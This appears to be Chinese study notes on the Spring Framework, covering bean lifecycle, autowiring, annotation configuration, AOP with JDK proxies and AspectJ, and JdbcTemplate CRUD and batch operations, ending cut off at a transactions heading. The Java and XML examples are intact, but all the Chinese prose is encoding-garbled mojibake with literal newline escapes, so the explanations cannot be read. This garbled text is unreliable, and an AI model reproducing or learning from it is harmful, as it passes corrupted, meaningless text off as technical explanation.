è®¾ç½®scopeå¼æ¯prototypeæ¶åï¼ä¸æ¯å¨å è½½springéç½®æä»¶æ¶ååå»ºå¯¹è±¡ï¼å¨è°ç¨getBeanæ¹æ³æ¶ååå»ºå¤å®ä¾å¯¹è±¡\n\n# Beançå½å¨æååç½®å¤çå¨\n\n# Beançå½å¨æ\n\n * éè¿æé å¨åå»ºbeanå®ä¾ï¼æ åæ°æé ï¼\n * ä¸ºbeançå±æ§è®¾ç½®å¼åå¯¹å¶ä»beanå¼ç¨ï¼è°ç¨setæ¹æ³ï¼\n * æbeanå®ä¾ä¼ ébeanåç½®å¤çå¨çæ¹æ³postProcessBeforeInitialization\n * è°ç¨beançåå§åçæ¹æ³ï¼éè¦è¿è¡éç½®åå§åçæ¹æ³ï¼\n * æbeanå®ä¾ä¼ ébeanåç½®å¤çå¨çæ¹æ³ postProcessAfterInitialization\n * beanå¯ä»¥ä½¿ç¨äºï¼å¯¹è±¡è·åå°äºï¼\n * å½å®¹å¨å³é­æ¶åï¼è°ç¨beançéæ¯çæ¹æ³ï¼éè¦è¿è¡éç½®éæ¯çæ¹æ³ï¼\n\n# åç½®å¤çå¨\n\nåå»ºåç½®å¤çå¨éè¦å®ç°BeanPostProcessoræ¥å£ï¼å¹¶éå%Before%å%After%ä¸¤ä¸ªæ¹æ³ã\n\n# å±æ§èªå¨è£é\n\næ ¹æ®æå®è£éè§åï¼å±æ§åç§°æèå±æ§ç±»åï¼ï¼Springèªå¨å°å¹éçå±æ§å¼è¿è¡æ³¨å¥ã\n\næ ¹æ®åç§°èªå¨è£é\n<bean id="emp" class="com.pwddd.spring5.Emp" autowire="byName"></bean>\n    <bean id="dept" class="com.pwddd.spring5.Dept"></bean>\n    <bean id="dept2" class="com.pwddd.spring5.Dept"></bean>\n\næ ¹æ®ç±»åèªå¨è£é  æ¥é å­å¨ä¸¤ä¸ªç¸åçç±»å\n<bean id="emp" class="com.pwddd.spring5.Emp" autowire="byType"></bean>\n    <bean id="dept" class="com.pwddd.spring5.Dept"></bean>\n    <bean id="dept2" class="com.pwddd.spring5.Dept"></bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n# å¼å¥å¤é¨éç½®æä»¶\n\néç½®æ°æ®æºçæ¹å¼1ï¼\n\n<bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n    <property name="url" value="jdbc:mysql://localhost:3306/aaaa" />\n    <property name="username" value="root" />\n    <property name="password" value="root" />\n    <property name="driverClassName" value="com.mysql.jdbc.driver" />\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n\n\néç½®æ°æ®æºçæ¹å¼2ï¼\n\n 1. åå»ºjdbc.propertieså¤é¨éç½®æä»¶\n\njdbc.url=jdbc:mysql://localhost:3306/aaa\njdbc.username=root\njdbc.password=root\njdbc.driver=com.jdbc.mysql.driver\n\n\n1\n2\n3\n4\n\n 2. å¼å¥å°XMLä¸­ï¼å¹¶è¿è¡å¼ç¨ã\n\n<context:property-placeholder location="classpath:jdbc.properties"></context:property-placeholder>\n<bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n    <property name="driverClassName" value="${jdbc.driver}"/>\n    <property name="username" value="${jdbc.username}" />\n    <property name="url" value="${jdbc.url}" />\n    <property name="password" value="${jdbc.password}" />\n</bean>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# åºäºæ³¨è§£è¿è¡éç½®\n\næ³¨è§£æ¯ä»£ç ç¹æ®æ è®°ï¼æ ¼å¼ï¼@æ³¨è§£åç§°(å±æ§åç§°=å±æ§å¼, å±æ§åç§°=å±æ§å¼..)ãæ³¨è§£å¯ä»¥æ¾å¨ç±»ä¸é¢ãæ¹æ³ä¸é¢ãå±æ§ä¸é¢ãä½¿ç¨æ³¨è§£è¿è¡éç½®å¯ä»¥ç®åXMLæä»¶ã\n\n# åå»ºå¯¹è±¡\n\nSpringéå¯¹Beanç®¡çä¸­åå»ºå¯¹è±¡æä¾æ³¨è§£\n\n * @Component -- æ®ébean\n * @Service -- serviceå±\n * @Controller -- controllerå±\n * @Repository --daoå±\n\nä½¿ç¨æ¹å¼ï¼\n\n 1. å¼å¯ç»ä»¶æ«æ\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n     xmlns:context="http://www.springframework.org/schema/context"\n     xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\nhttp://www.springframework.org/schema/context  http://www.springframework.org/schema/context/spring-context.xsd">\n  <context:component-scan base-package="com.pwddd.spring5.anno"></context:component-scan>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. å°æ³¨è§£å å°ç±»ä¸\n\npackage com.pwddd.spring5.anno;\n\nimport org.springframework.stereotype.Service;\n\n@Service(value = "userService")\npublic class UserService {\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 3. éç½®ç»ä»¶æ«æè¿æ»¤ ç»ä»¶æ«æå¯ä»¥éç½®æ«ææäºç»ä»¶ãä¸æ«ææäºç»ä»¶ã\n\n<context:component-scan base-package="com.pwddd.spring5.anno" use-default-filters="false">\n    <context:include-filter type="annotation" expression="org.springframework.stereotype.Service"/>\n    <context:exclude-filter type="annotation" expression="org.springframework.stereotype.Controller"/>\n</context:component-scan>\n\n\n1\n2\n3\n4\n\n\n# æ³¨å¥å±æ§\n\næ³¨å¥å±æ§æä¸é¢å ç§æ³¨è§£çæ¹å¼ï¼\n\n * @Autowiredï¼æ ¹æ®å±æ§ç±»åè¿è¡èªå¨è£é\n * @Qualifierï¼æ ¹æ®åç§°è¿è¡æ³¨å¥ è¿ä¸ª@Qualifieræ³¨è§£çä½¿ç¨ï¼åä¸é¢@Autowiredä¸èµ·ä½¿ç¨\n * @Resourceï¼å¯ä»¥æ ¹æ®ç±»åæ³¨å¥ï¼å¯ä»¥æ ¹æ®åç§°æ³¨å¥\n * @Valueï¼æ³¨å¥æ®éç±»åå±æ§\n\næµè¯ç±»ï¼\n\npackage com.pwddd.spring5.anno;\n\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.beans.factory.annotation.Qualifier;\nimport org.springframework.beans.factory.annotation.Value;\nimport org.springframework.stereotype.Service;\n\nimport javax.annotation.Resource;\n\n@Service(value = "userService")\npublic class UserService {\n//    @Autowired\n//    @Qualifier(value = "dao")\n  @Resource\n  public UserDao userDao;\n\n  @Value("halo")\n  public String name;\n\n  public void test(){\n      System.out.println(name);\n      userDao.add();\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n# å®å¨æ³¨è§£å¼å\n\nä½¿ç¨ä¸ä¸ªç±»æ¥æ¿æ¢xmlæä»¶ï¼è¿è¡éç½®ã\n\n@Configuration  // å£°æè¿æ¯ä¸ä¸ªéç½®ç±»\n@ComponentScan(basePackages = {"com.pwddd.spring5.anno"})  //éç½®åæ«æ\npublic class SpringConfig {\n}\n\n\n1\n2\n3\n4\n\n\næµè¯ä»£ç AnnotationConfigApplicationContextä½¿ç¨ç±»çæcontextå¯¹è±¡\n\n@Test\npublic void test(){\n    ApplicationContext context = new AnnotationConfigApplicationContext(SpringConfig.class);\n    UserService userService = context.getBean("userService", UserService.class);\n    userService.test();\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# æ³¨è§£æ¹å¼çéç½®æä»¶æ³¨å¥\n\npackage com.pwddd.spring5.dao.impl;  \n  \nimport com.pwddd.spring5.dao.UserDao;  \nimport com.pwddd.spring5.entity.User;  \nimport org.springframework.beans.factory.annotation.Autowired;  \nimport org.springframework.beans.factory.annotation.Value;  \nimport org.springframework.context.annotation.PropertySource;  \nimport org.springframework.stereotype.Repository;  \n  \n@Repository  \n@PropertySource("classpath:test.properties")  \npublic class UserDaoImpl implements UserDao {  \n  \n @Value("${properties.result}")  \n private String result;  \n  \n @Override  \n public User getUserByUserName(String username) {  \n System.out.println(result);  \n return new User("zhangsan","male",12);  \n }  \n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# SpringAOP\n\n\n# AOPæ¦å¿µ\n\né¢ååé¢ç¼ç¨ï¼æ¹é¢ï¼ï¼å©ç¨ AOP å¯ä»¥å¯¹ä¸å¡é»è¾çåä¸ªé¨åè¿è¡éç¦»ï¼ä»èä½¿å¾ ä¸å¡é»è¾åé¨åä¹é´çè¦ååº¦éä½ï¼æé«ç¨åºçå¯éç¨æ§ï¼åæ¶æé«äºå¼åçæçã éä¿æè¿°ï¼ä¸éè¿ä¿®æ¹æºä»£ç æ¹å¼ï¼å¨ä¸»å¹²åè½éé¢æ·»å æ°åè½ã\n\n\n\n\n# AOPåºå±åç\n\nAOPåºå±ä½¿ç¨å¨æä»£çå®ç°ï¼å¨æä»£çæä¸¤ç§ï¼ä¸ç§æ¯ææ¥å£çæåµï¼ä½¿ç¨JDKçå¨æä»£çã\n\n\n\nç¬¬äºç§æ¯æ²¡ææ¥å£çæåµï¼ä½¿ç¨cglibå¨æä»£ç\n\n\n\nJDKå¨æä»£çå®ç°çæ¹å¼\n\n\n\n 1. åå»ºæ¥å£ï¼å®ä¹ç¸å³çæ¹æ³\n\npackage com.pwddd.spring5aop.test;\n\npublic interface UserDao {\n    int add(int a, int b);\n    String update(String id);\n}\n\npackage com.pwddd.spring5aop.test;\n\npublic class UserDaoImpl implements UserDao{\n    @Override\n    public int add(int a, int b) {\n        System.out.println("add... æ¹æ³æ§è¡äºï¼");\n        return a+b;\n    }\n\n    @Override\n    public String update(String id) {\n        return id;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n 2. åå»ºä»£çç±»\n\npackage com.pwddd.spring5aop.test;\n\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.util.Arrays;\n\npublic class JDKProxy {\n    public static void main(String[] args) {\n        Class[] interfaces = {UserDao.class};\n        UserDaoImpl userDao = new UserDaoImpl();\n        UserDao dao = (UserDao) Proxy.newProxyInstance(JDKProxy.class.getClassLoader(), interfaces, new UserDaoPRoxy(userDao));\n        System.out.println("result:"+dao.add(1, 2));\n    }\n}\n\nclass UserDaoPRoxy implements InvocationHandler{\n    private Object obj;\n\n    public UserDaoPRoxy(Object obj) {\n        this.obj = obj;\n    }\n\n    @Override\n    public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\n\n        // æ¹æ³æ§è¡ä¹å\n        System.out.println("æ¹æ³æ§è¡ä¹å:"+method.getName()+ Arrays.toString(args));\n        Object result = method.invoke(obj, args);\n        System.out.println("æ¹æ³æ§è¡ä¹å:"+obj);\n        return result;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# AOPç¸å³æ¦å¿µ\n\nè¿æ¥ç¹ - ç±»éçé£äºæ¹æ³å¯ä»¥è¢«å¢å¼ºï¼è¿äºå¯ä»¥è¢«å¢å¼ºçæ¹æ³ç§°ä¸ºè¿æ¥ç¹ åå¥ç¹ - å®éè¢«çæ­£å¢å¼ºçæ¹æ³ç§°ä¸ºåå¥ç¹ éç¥ï¼å¢å¼ºï¼ - ç¨äºå¢å¼ºçé»è¾é¨å - åä¸ºï¼åç½®ãåç½®ãç¯ç»ãå¼å¸¸ãè¿åï¼æç»ï¼éç¥ç±»å åé¢ - å®éä¸æå¢å¼ºåºç¨å°åå¥ç¹çè¿ç¨ï¼è¿ä¸ªå¨ä½ã\n\n\n# AOPç¯å¢åå¤\n\nSpring æ¡æ¶ä¸è¬é½æ¯åºäº AspectJ å®ç° AOP æä½ãAspectJ ä¸æ¯ Spring ç»æé¨åï¼æ¯ä¸ä¸ªç¬ç« çAOP æ¡æ¶ï¼ä¸è¬æ AspectJ å Spirng æ¡æ¶ä¸èµ·ä½¿ç¨ï¼è¿è¡ AOP æä½ã åºäºAspectJæä¸¤ç§å®ç°AOPçæä½æ¹å¼ï¼\n\n * åºäºXMLæä»¶çæ¹å¼\n * åºäºæ³¨è§£çæ¹å¼\n\nä¾èµçJARåï¼\n\n\n\nåå¥ç¹è¡¨è¾¾å¼\nåå¥ç¹è¡¨è¾¾å¼ä½ç¨ï¼ç¥éå¯¹åªä¸ªç±»éé¢çåªä¸ªæ¹æ³è¿è¡å¢å¼º\nè¯­æ³ç»æï¼ execution([æéä¿®é¥°ç¬¦] [è¿åå¼ç±»å] [ç±»å¨è·¯å¾\\].æ¹æ³å(\\[å½¢ååè¡¨\\])\nä¸¾ä¾ 1ï¼å¯¹ com.atguigu.dao.BookDao ç±»éé¢ç add è¿è¡å¢å¼º \n\texecution(* com.atguigu.dao.BookDao.add(..)) \nä¸¾ä¾ 2ï¼å¯¹ com.atguigu.dao.BookDao ç±»éé¢çææçæ¹æ³è¿è¡å¢å¼º \n\texecution(* com.atguigu.dao.BookDao.* (..)\nä¸¾ä¾ 3ï¼å¯¹ com.atguigu.dao åéé¢ææç±»ï¼ç±»éé¢æææ¹æ³è¿è¡å¢å¼º \n\texecution(* com.atguigu.dao.*.** (..))\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# åºäºæ³¨è§£æ¹å¼çéç½®\n\n 1. åå»ºå¢å¼ºç±»åè¢«å¢å¼ºçæ¹æ³\n\npublic class User {\n    public void add(){\n        /**\n         * è¢«å¢å¼ºæ¹æ³\n         */\n        System.out.println("add........");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n 2. åå»ºå¢å¼ºç±»åç¸å³å¢å¼ºæ¹æ³\n\npublic class UserProxy {\n    /**\n     * å¢å¼ºæ¹æ³\n     */\n    public void before(){\n        System.out.println("before ..... UserProxy");\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n 3. è¿è¡éç½®ï¼å¼å¯æ³¨è§£æ«æï¼çæä»£çå¯¹è±¡\n\n\x3c!--    å¼å¯æ³¨è§£æ«æ--\x3e\n <context:component-scan base-package="com.pwddd.spring5aop.aopanno" />\n\x3c!--    å¼å¯çæä»£çå¯¹è±¡--\x3e\n <aop:aspectj-autoproxy />\n\n\n1\n2\n3\n4\n\n 4. éç½®éç¥ç±»å\n\n@Before(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void before(){\n    System.out.println("before ..... UserProxy");\n}\n\n@After(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void after(){\n    System.out.println("after ..... UserProxy");\n}\n@AfterThrowing(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void afterThrowing(){\n    System.out.println("afterThrowing ..... UserProxy");\n}\n\n@AfterReturning(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void afterReturning(){\n    System.out.println("afterReturning ..... UserProxy");\n}\n\n@Around(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void around(ProceedingJoinPoint proceedingJoinPoint) throws Throwable {\n\n    System.out.println("around ..... qian");\n    proceedingJoinPoint.proceed();\n    System.out.println("around ------ hou");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 5. ç¸ååå¥ç¹è¡¨è¾¾å¼å¯æ½ååºæ¥\n\n/**\n * æ½åç¸åçåå¥ç¹è¡¨è¾¾å¼\n */\n@Pointcut(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\npublic void mypoint(){\n\n}\n\n/**\n * å¢å¼ºæ¹æ³\n */\n@Before(value = "mypoint()")\npublic void before(){\n    System.out.println("before ..... UserProxy");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n 6. å¤ä¸ªå¢å¼ºçæ¹æ³ä½ç¨äºåä¸ä¸ªæ¹æ³ï¼å¯ä»¥è®¾ç½®ä¼åçº§\n\n@Component\n@Aspect\n@Order(1)\npublic class PersonProxy {\n    @Before(value = "execution(* com.pwddd.spring5aop.aopanno.User.add(..))")\n    public void before(){\n        System.out.println("person ......");\n    }\n}\n\nä»å°å°å¤§ä¼åçº§éä½\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n 7. éç½®å®å¨æ³¨è§£å¼å\n\npackage com.pwddd.spring5aop.aopanno;\n\nimport org.springframework.context.annotation.ComponentScan;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.context.annotation.EnableAspectJAutoProxy;\n\n@Configuration\n@ComponentScan(basePackages = {"com.pwddd.spring5aop.aopanno"})  // å¼å¯æ³¨è§£æ«æ\n@EnableAspectJAutoProxy(proxyTargetClass = true)  // å¼å¯éç½®aopå¯¹è±¡\npublic class SpringConfig {\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> TIPS: å½ç¨åºè¿è¡æåºå¼å¸¸æ¶ï¼AfterThrowingãAfterå­å¨ï¼AfterReturningä¸å­å¨ã\n\n\n# åºäºXMLæ¹å¼éç½®\n\n 1. åå»ºå¢å¼ºç±»ãå¢å¼ºæ¹æ³ãè¢«å¢å¼ºç±»ãè¢«å¢å¼ºæ¹æ³\n\npackage com.pwddd.spring5aop.aopxml;\n\n/**\n * å¢å¼ºç±»\n */\npublic class BookProxy {\n    /**\n     * å¢å¼ºæ¹æ³\n     */\n    public void before(){\n        System.out.println("before.....");\n    }\n}\n\npackage com.pwddd.spring5aop.aopxml;\n\n/**\n * è¢«å¢å¼ºç±»\n */\npublic class Book {\n    /**\n     * è¢«å¢å¼ºæ¹æ³\n     */\n    public void buy(){\n        System.out.println("buy .....");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n 2. ç¼åSpringéç½®æä»¶\n\n<beans xmlns="http://www.springframework.org/schema/beans"\n     xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n     xmlns:context="http://www.springframework.org/schema/context"\n     xmlns:aop="http://www.springframework.org/schema/aop"\n     xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                      http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                      http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd">\n\n  <bean id="book" class="com.pwddd.spring5aop.aopxml.Book" />\n  <bean id="bookProxy" class="com.pwddd.spring5aop.aopxml.BookProxy" />\n\n\x3c!--    // éç½®åå¥ç¹--\x3e\n  <aop:config>\n      <aop:pointcut id="buy" expression="execution(* com.pwddd.spring5aop.aopxml.Book.buy(..))"/>\n      <aop:aspect ref="bookProxy">\n          <aop:before method="before" pointcut-ref="buy" />\n      </aop:aspect>\n  </aop:config>\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# JdbcTemplate\n\n\n# æ¦è¿°\n\nSpring æ¡æ¶å¯¹ JDBC è¿è¡å°è£ï¼ä½¿ç¨ JdbcTemplate æ¹ä¾¿å®ç°å¯¹æ°æ®åºæä½ã\n\n\n# åå¤å·¥ä½\n\n 1. å¯¼å¥ç¸å³Jarå\n\n\n\n 2. éç½®Springéç½®æä»¶ï¼å¼å¯æ³¨è§£æ«æãéç½®æ°æ®æºãéç½®JDBCTemplateå¯¹è±¡ã\n\n<?xml version="1.0" encoding="UTF-8"?>\n<beans xmlns="http://www.springframework.org/schema/beans"\n       xmlns:context="http://www.springframework.org/schema/context"\n       xmlns:util="http://www.springframework.org/schema/util"\n       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"\n       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\n                    http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\n                    http://www.springframework.org/schema/util http://www.springframework.org/schema/util/spring-util.xsd">\n\x3c!--    å¼å¯æ³¨è§£æ«æ--\x3e\n    <context:component-scan base-package="com.pwddd.spring5.jdbc" />\n\x3c!--    å¯¼å¥éç½®æä»¶--\x3e\n    <context:property-placeholder location="classpath:jdbc.properties" />\n\x3c!--    éç½®æ°æ®æº--\x3e\n    <bean id="dataSource" class="com.alibaba.druid.pool.DruidDataSource">\n        <property name="url" value="${jdbc.url}" />\n        <property name="username" value="${jdbc.username}" />\n        <property name="driverClassName" value="${jdbc.driver}" />\n        <property name="password" value="${jdbc.password}" />\n    </bean>\n\n\x3c!--    éç½®jdbcTemplate--\x3e\n    <bean id="jdbcTemplate" class="org.springframework.jdbc.core.JdbcTemplate">\n        <property name="dataSource" ref="dataSource" />\n    </bean>\n\n</beans>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n 3. ç¼åç¸å³ä¸å¡æ¹æ³\n\nservice\n\npackage com.pwddd.spring5.jdbc.service.impl;\n\nimport com.pwddd.spring5.jdbc.dao.BookDao;\nimport com.pwddd.spring5.jdbc.service.BookService;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class BookServiceImpl implements BookService {\n\t@Autowired\n\tprivate BookDao bookDao;\n\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\nDao\n\npackage com.pwddd.spring5.jdbc.dao.impl;\n\nimport com.pwddd.spring5.jdbc.dao.BookDao;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class BookDaoImpl implements BookDao {\n\t@Autowired\n\tprivate JdbcTemplate jdbcTemplate;\n}\t\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n 4. ç¼åæµè¯æ¹æ³\n\npackage com.pwddd.spring5.jdbc.test;\n\nimport com.pwddd.spring5.jdbc.service.BookService;\nimport org.junit.Test;\nimport org.springframework.context.ApplicationContext;\nimport org.springframework.context.support.ClassPathXmlApplicationContext;\n\npublic class TestJDBC {\n\n@Test\npublic void testJDBC(){\n\tApplicationContext applicationContext =\n\t\t\tnew ClassPathXmlApplicationContext("bean1.xml");\n\tBookService bookServiceImpl = applicationContext.getBean("bookServiceImpl", BookService.class);\n\tSystem.out.println(bookServiceImpl);\n}\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# CRUD\n\n# CUD\n\nå¨è¿è¡å¢å æ¹æä½ï¼è°ç¨jdbcTemplateçupdateæ¹æ³è¿è¡ã\n\n\n\nè¯¥æ¹æ³æä¸¤ä¸ªåæ°ï¼ç¬¬ä¸ä¸ªä¸ºSQLè¯­å¥ãç¬¬äºä¸ªä¸ºå¯ååæ°ã æµè¯ä»£ç ï¼\n\npackage com.pwddd.spring5.jdbc.dao.impl;\n\nimport com.pwddd.spring5.jdbc.dao.BookDao;\nimport com.pwddd.spring5.jdbc.entity.Book;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.jdbc.core.JdbcTemplate;\nimport org.springframework.stereotype.Component;\n\n@Component\npublic class BookDaoImpl implements BookDao {\n    @Autowired\n    private JdbcTemplate jdbcTemplate;\n\n    @Override\n    public int add(Book book) {\n        String sql = "insert into book values(?,?,?)";\n        Object[] args = {book.getBookId(),book.getBookName(),book.getBookAuthor()};\n        return jdbcTemplate.update(sql,args);\n    }\n\n    @Override\n    public int deleteBookById(String id) {\n        String sql = "delete from book where bookid=?";\n        Object[] args = {id};\n        return jdbcTemplate.update(sql,args);\n    }\n\n    @Override\n    public int updateBookInfo(Book book) {\n        String sql = "update book set bookname=?,bookauthor=? where bookid=?";\n        Object[] args = {book.getBookName(),book.getBookAuthor(),book.getBookId()};\n        return jdbcTemplate.update(sql,args);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n# R\n\njdbcTemplateæ¥è¯¢æ»å±åä¸ºä¸ç§æåµï¼\n\n * ä½¿ç¨èåå½æ°æ¥è¯¢åä¸ªå¼\n * æ¥è¯¢åæ¡è®°å½ä¿¡æ¯\n * æ¥è¯¢åè¡¨\n\n# åå¼æ¥è¯¢\n\nåå¼æ¥è¯¢æ¯å©ç¨SQLè¯­å¥çèåå½æ°å¦Countæ¥è¯¢åä¸ªå­æ®µãä½¿ç¨å¦ä¸æ¹æ³è¿è¡æ¥è¯¢ï¼\n\n\n\nè¯¥æ¹æ³å±ä¸¤ä¸ªåæ°ï¼ç¬¬ä¸ä¸ªä¸ºSQLè¯­å¥ï¼ç¬¬äºä¸ªåæ°ä¸ºè¿åå¼çç±»åã å®ä¾ä»£ç ï¼\n\n@Override\npublic int queryBookNum() {\n    String sql = "select count(*) from book";\n    Integer integer = jdbcTemplate.queryForObject(sql, Integer.class);\n    return integer;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# åæ¡è®°å½æ¥è¯¢\n\nåæ¡è®°å½æ¥è¯¢çç»æå¯¹åºä¸ä¸ªå®ä½ç±»ãä½¿ç¨å¦ä¸çæ¹æ³è¿è¡æ¥è¯¢ï¼\n\n\n\nè¯¥æ¹æ³æä¸ä¸ªåæ°ï¼\n\n * SQLè¯­å¥\n * RowMapper æ¯æ¥å£ï¼éå¯¹è¿åä¸åç±»åæ°æ®ï¼ä½¿ç¨è¿ä¸ªæ¥å£éé¢å®ç°ç±»å®ææ°æ®å°è£\n * å¯åçSQLè¯­å¥åæ°ã\n\nå®ä¾ä»£ç ï¼\n\n@Override\npublic Book queryBookById(String id) {\n    String sql = "select * from book where bookid=?";\n    Book book = jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper<Book>(Book.class), id);\n    return book;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# éåæ¥è¯¢\n\néåæ¥è¯¢çæ¥è¯¢ç»ææ¯ä¸ä¸ªéåï¼ä½¿ç¨å¦ä¸çæ¹æ³è¿è¡æ¥è¯¢ï¼\n\n\n\nè¯¥æ¹æ³çåæ°ç±»ä¼¼åæ¡è®°å½æ¥è¯¢ã\n\nå®ä¾ä»£ç ï¼\n\n@Override\npublic List<Book> queryAllBook() {\n    String sql = "select * from book";\n    List<Book> books = jdbcTemplate.query(sql, new BeanPropertyRowMapper<Book>(Book.class));\n    return books;\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n# æ¹éæä½\n\nä»¥ä¸çæ¹æ³é½åªè½åæ¬¡å¤çåæ¡æ°æ®ï¼å¾å¾éå°éè¦æ¹éå¤çæ°æ®åºæ°æ®çéæ±ï¼ä¸é¢çæ¹æ³å°±åä¸ä»å¿äºãjdbcTemplateä¹æä¾äºæ°æ®åºæ¹éæä½çæ¹æ³ã\n\n\n\nè¯¥æ¹æ³çåæ°åä¸é¢å¢å æ¹çæä½æ¹æ³ç¸ä¼¼ï¼åªæ¯å¯ååæ°æ¢æäºObjectæ°ç»çListéåï¼åä¸ªObjectæ°ç»å¯¹åºæ°æ®åºä¸­çä¸ä¸ªè®°å½ã\n\nå®ä¾ä»£ç ï¼\n\n@Override\npublic void batchDelete(List<Object[]> args) {\n    String sql = "delete from book where bookid=?";\n    jdbcTemplate.batchUpdate(sql,args);\n}\n\n@Override\npublic void batchUpdate(List<Object[]> args) {\n    String sql = "update book set bookname=?,bookauthor=? where bookid=?";\n    jdbcTemplate.batchUpdate(sql,args);\n}\n\n@Override\npublic void batchAdd(List<Object[]> args) {\n    String sql = "insert into book values(?,?,?)";\n    jdbcTemplate.batchUpdate(sql,args);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\næµè¯ä»£ç ï¼\n\n@Test\npublic void batch(){\n    List<Object[]> addArgs = new ArrayList<>();\n    Object[] o1 = {"100","test100","a100"};\n    Object[] o2 = {"200","test200","a200"};\n    Object[] o3 = {"300","test300","a300"};\n    addArgs.add(o1);\n    addArgs.add(o2);\n    addArgs.add(o3);\n//        bookServiceImpl.batchAdd(addArgs);\n    List<Object[]> updateArgs = new ArrayList<>();\n    Object[] ou1 = {"TEST100","a100","100"};\n    Object[] ou2 = {"TEST200","a200","200"};\n    Object[] ou3 = {"TEST300","a300","300"};\n    updateArgs.add(ou1);\n    updateArgs.add(ou2);\n    updateArgs.add(ou3);\n    bookServiceImpl.batchUpdate(updateArgs);\n    List<Object[]> delArgs = new ArrayList<>();\n    Object[] od1 = {"100"};\n    Object[] od2 = {"300"};\n    delArgs.add(od1);\n    delArgs.add(od2);\n    bookServiceImpl.batchDelete(delArgs);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n\n\n\n# äºå¡\n\n\n# æ¦å¿µ\n\näºå¡æ¯æ°æ®åºæä½æåºæ¬åå